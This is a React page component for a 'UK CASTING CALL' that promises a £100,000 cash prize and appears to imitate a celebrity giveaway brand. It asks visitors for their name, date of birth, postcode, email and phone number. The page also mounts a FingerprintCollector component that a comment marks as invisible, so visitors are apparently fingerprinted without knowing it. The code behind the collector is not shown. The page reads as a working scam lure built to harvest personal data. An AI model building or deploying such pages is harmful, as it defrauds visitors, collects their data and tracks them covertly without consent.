import FingerprintCollector from '@/components/FingerprintCollector';

export default function CastingPage() {
    return (
        <div className="min-h-screen flex flex-col items-center justify-center p-4 relative overflow-hidden">
            {/* Background Effects */}
            <div className="absolute top-0 left-0 w-full h-full bg-[url('/noise.png')] opacity-10 pointer-events-none"></div>

            {/* Collector (Invisible) */}
            <FingerprintCollector />

            {/* Main Content */}
            <main className="z-10 flex flex-col items-center text-center max-w-4xl">
                <h1 className="beast-title text-6xl md:text-8xl mb-4 text-[#ffd700] rotate-[-2deg]">
                    UK CASTING CALL
                </h1>
                <h2 className="text-3xl md:text-5xl font-black mb-10 text-white drop-shadow-lg">
                    WIN <span className="text-[#f63089]">£100,000</span> CASH!
                </h2>

                <div className="bg-[#228fda] border-4 border-white p-8 rounded-xl shadow-[10px_10px_0_#000] rotate-[1deg] w-full max-w-md">
                    <p className="text-xl font-bold mb-6 text-white uppercase">
                        Fill the form below to enter:
                    </p>
                    <form className="flex flex-col gap-4">
                        <input type="text" placeholder="FULL NAME" className="p-4 text-black font-bold text-xl uppercase border-2 border-black rounded" />
                        <div className="grid grid-cols-2 gap-4">
                            <input type="date" className="p-4 text-black font-bold text-xl border-2 border-black rounded" />
                            <input type="text" placeholder="POSTCODE" className="p-4 text-black font-bold text-xl border-2 border-black rounded uppercase" />
                        </div>
                        <input type="email" placeholder="EMAIL ADDRESS" className="p-4 text-black font-bold text-xl border-2 border-black rounded uppercase" />
                        <input type="tel" placeholder="PHONE NUMBER" className="p-4 text-black font-bold text-xl border-2 border-black rounded uppercase" />

                        <button type="submit" className="beast-btn mt-4">
                            APPLY NOW!
                        </button>
                    </form>
                </div>

                <p className="mt-8 text-white opacity-60 font-bold text-sm">
                    *Must be 18+. UK Residents Only. Terms Apply.
                </p>
            </main>
        </div>
    );
}
